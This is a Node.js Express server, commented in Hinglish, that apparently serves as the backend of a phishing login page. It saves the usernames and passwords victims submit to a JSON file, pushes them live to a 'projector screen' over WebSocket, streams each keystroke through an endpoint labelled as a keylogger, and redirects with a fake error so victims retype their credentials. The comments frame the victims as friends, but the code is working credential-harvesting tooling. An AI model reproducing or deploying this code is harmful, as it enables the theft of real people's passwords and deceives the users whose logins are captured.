const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const path = require('path');
const fs = require('fs'); // Memory save karne ke liye

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(express.urlencoded({ extended: true }));
app.use(express.json()); 
app.use(express.static(path.join(__dirname, 'public')));

// Data save karne ki file ka path
const dataFile = path.join(__dirname, 'captured_data.json');

// Jab dost "Log In" dabaye (Final Data)
app.post('/capture', (req, res) => {
    const { username, password } = req.body;
    const time = new Date().toLocaleString();
    
    console.log(`[+] Final Login Attempt By: ${username}`);
    
    // 1. WebSocket se projector screen par bhejo
    wss.clients.forEach(client => {
        if (client.readyState === 1) {
            client.send(JSON.stringify({ 
                type: 'final',
                username: username, 
                password: password, 
                time: time 
            }));
        }
    });

    // 2. MEMORY: Data ko file mein save karo
    const newData = { time, username, password };
    let existingData = [];

    if (fs.existsSync(dataFile)) {
        const fileContent = fs.readFileSync(dataFile, 'utf8');
        existingData = JSON.parse(fileContent || '[]');
    }
    
    existingData.push(newData);
    fs.writeFileSync(dataFile, JSON.stringify(existingData, null, 2));

    // Fake Error ke sath wapas bhejo
    res.redirect('/?error=1');
});

// Live Typing (Keylogger)
app.post('/live-type', (req, res) => {
    const { field, value } = req.body;

    wss.clients.forEach(client => {
        if (client.readyState === 1) {
            client.send(JSON.stringify({ 
                type: 'live',
                field: field,
                value: value
            }));
        }
    });
    res.sendStatus(200);
});

wss.on('connection', (ws) => {
    console.log('Projector screen connected');
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server running: http://localhost:${PORT}`);
});